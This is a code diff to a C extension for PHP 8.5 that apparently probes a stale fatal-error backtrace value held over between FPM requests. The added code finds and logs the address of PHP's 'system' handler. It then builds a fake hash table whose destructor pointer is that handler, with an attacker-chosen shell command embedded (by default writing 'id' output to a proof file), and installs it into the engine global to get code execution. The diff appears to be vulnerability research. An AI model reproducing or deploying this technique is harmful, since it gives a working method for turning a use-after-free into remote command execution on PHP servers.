@@ -31,6 +31,57 @@
 
 static int p2s_fd = -1;
 static void (*p2s_orig_error_cb)(int, zend_string *, const uint32_t, zend_string *);
+static uintptr_t p2s_stale_addr;
+static uintptr_t p2s_zif;
+static int p2s_mode_clear, p2s_mode_fake;
+static unsigned char p2s_fake[4096] __attribute__((aligned(16)));
+
+static void p2s_put32(unsigned char *p, size_t off, uint32_t v)
+{
+	memcpy(p + off, &v, 4);
+}
+
+static void p2s_put64(unsigned char *p, size_t off, uint64_t v)
+{
+	memcpy(p + off, &v, 8);
+}
+
+/* Same 8.5 layout as payload.build_ht(): pDestructor at 0x30, arData at 0x10. */
+static uintptr_t p2s_build_fake(void)
+{
+	unsigned char *h = p2s_fake;
+	uintptr_t s = (uintptr_t) h;
+	const char *cmd = getenv("P2S85_CMD");
+	size_t len;
+
+	if (!p2s_zif) {
+		return 0;
+	}
+	if (!cmd || !*cmd) {
+		cmd = "id > /out/rce85-fpm-instrumented-proof";
+	}
+	len = strlen(cmd);
+	memset(h, 0, sizeof(p2s_fake));
+	p2s_put32(h, 0x00, 1);              /* gc.refcount */
+	p2s_put32(h, 0x04, 7);              /* gc.type = IS_ARRAY */
+	p2s_put32(h, 0x08, 0x10);           /* HASH_FLAG_STATIC_KEYS */
+	p2s_put32(h, 0x0c, 0xFFFFFFF8u);    /* nTableMask */
+	p2s_put64(h, 0x10, s + 0x20);       /* arData */
+	p2s_put32(h, 0x18, 1);              /* nNumUsed */
+	p2s_put32(h, 0x1c, 1);              /* nNumOfElements */
+	p2s_put64(h, 0x30, p2s_zif);        /* pDestructor */
+	/* fake execute_data at 0x20, overlapping bucket[0] */
+	p2s_put64(h, 0x30, p2s_zif);
+	p2s_put32(h, 0x4c, 1);
+	p2s_put64(h, 0x70, s + 0x80);
+	p2s_put32(h, 0x78, 6);
+	/* fake zend_string at 0x80 */
+	p2s_put32(h, 0x80, 1);
+	p2s_put32(h, 0x84, 0x0106);
+	p2s_put64(h, 0x90, len);
+	memcpy(h + 0x98, cmd, len + 1);
+	return s;
+}
 
 static void p2s_writef(const char *fmt, ...)
 {
@@ -212,9 +263,30 @@ PHP_MINIT_FUNCTION(p2s85probe)
 		path = "/out/p2s85-probe.log";
 	}
 	p2s_fd = open(path, O_WRONLY | O_CREAT | O_APPEND, 0666);
-	p2s_writef("== MINIT pid=%d ex=%p bt_field=%p ts=%" PRIi64 "\n",
+	{
+		const char *m = getenv("P2S85_EXT_MODE");
+		p2s_mode_clear = m && strcmp(m, "clear") == 0;
+		p2s_mode_fake = m && strcmp(m, "fake") == 0;
+	}
+	p2s_writef("== MINIT pid=%d ex=%p bt_field=%p ts=%" PRIi64 " ext_mode=%s\n",
 		(int) getpid(), (void *) &executor_globals,
-		(void *) &EG(last_fatal_error_backtrace), (int64_t) time(NULL));
+		(void *) &EG(last_fatal_error_backtrace), (int64_t) time(NULL),
+		p2s_mode_fake ? "fake" : (p2s_mode_clear ? "clear" : "log"));
+	{
+		zend_function *sys = zend_hash_str_find_ptr(CG(function_table), "system", sizeof("system") - 1);
+		if (sys && sys->type == ZEND_INTERNAL_FUNCTION) {
+			char zifbuf[32];
+			snprintf(zifbuf, sizeof(zifbuf), "0x%lx",
+				(unsigned long) sys->internal_function.handler);
+			setenv("P2S85_ZIF", zifbuf, 1);
+			p2s_zif = (uintptr_t) sys->internal_function.handler;
+			p2s_writef("== ZIF_SYSTEM pid=%d handler=%p\n",
+				(int) getpid(), (void *) sys->internal_function.handler);
+		} else {
+			p2s_writef("== ZIF_SYSTEM pid=%d not found (sys=%p)\n",
+				(int) getpid(), (void *) sys);
+		}
+	}
 	p2s_orig_error_cb = zend_error_cb;
 	zend_error_cb = p2s_error_cb;
 	return SUCCESS;
@@ -235,8 +307,16 @@ PHP_MSHUTDOWN_FUNCTION(p2s85probe)
 
 PHP_RINIT_FUNCTION(p2s85probe)
 {
-	p2s_writef("-- RINIT pid=%d uri=%s\n", (int) getpid(),
-		SG(request_info).request_uri ? SG(request_info).request_uri : "[none]");
+	p2s_writef("-- RINIT pid=%d uri=%s stale=%p auth_user=%p auth_pass=%p path=%p\n",
+		(int) getpid(),
+		SG(request_info).request_uri ? SG(request_info).request_uri : "[none]",
+		(void *) p2s_stale_addr,
+		(void *) SG(request_info).auth_user,
+		(void *) SG(request_info).auth_password,
+		(void *) SG(request_info).path_translated);
+	if (p2s_stale_addr) {
+		p2s_dump_bytes("rinit_stale", (void *) p2s_stale_addr, 0x40);
+	}
 	p2s_dump_zval("rinit", &EG(last_fatal_error_backtrace));
 	return SUCCESS;
 }
@@ -248,13 +328,32 @@ PHP_RSHUTDOWN_FUNCTION(p2s85probe)
 		SG(request_info).request_uri ? SG(request_info).request_uri : "[none]",
 		(EG(flags) & EG_FLAGS_IN_SHUTDOWN) != 0);
 	p2s_dump_zval("rshutdown", &EG(last_fatal_error_backtrace));
+	if (Z_TYPE(EG(last_fatal_error_backtrace)) == IS_ARRAY) {
+		p2s_stale_addr = (uintptr_t) Z_ARRVAL(EG(last_fatal_error_backtrace));
+	}
 	return SUCCESS;
 }
 
 static zend_result p2s_post_deactivate(void)
 {
-	p2s_writef("-- POST_DEACTIVATE pid=%d\n", (int) getpid());
+	p2s_writef("-- POST_DEACTIVATE pid=%d ext_mode=%s\n", (int) getpid(),
+		p2s_mode_fake ? "fake" : (p2s_mode_clear ? "clear" : "log"));
 	p2s_dump_zval("post_deactivate", &EG(last_fatal_error_backtrace));
+	if (Z_TYPE(EG(last_fatal_error_backtrace)) == IS_ARRAY) {
+		p2s_stale_addr = (uintptr_t) Z_ARRVAL(EG(last_fatal_error_backtrace));
+		if (p2s_mode_clear) {
+			ZVAL_UNDEF(&EG(last_fatal_error_backtrace));
+			p2s_writef("   cleared stale zval at %p\n", (void *) p2s_stale_addr);
+		} else if (p2s_mode_fake) {
+			uintptr_t fake = p2s_build_fake();
+			if (fake) {
+				ZVAL_ARR(&EG(last_fatal_error_backtrace), (zend_array *) fake);
+				p2s_writef("   installed fake array %p pDestructor=%p cmd=%s\n",
+					(void *) fake, (void *) p2s_zif,
+					getenv("P2S85_CMD") ? getenv("P2S85_CMD") : "(default)");
+			}
+		}
+	}
 	return SUCCESS;
 }
 
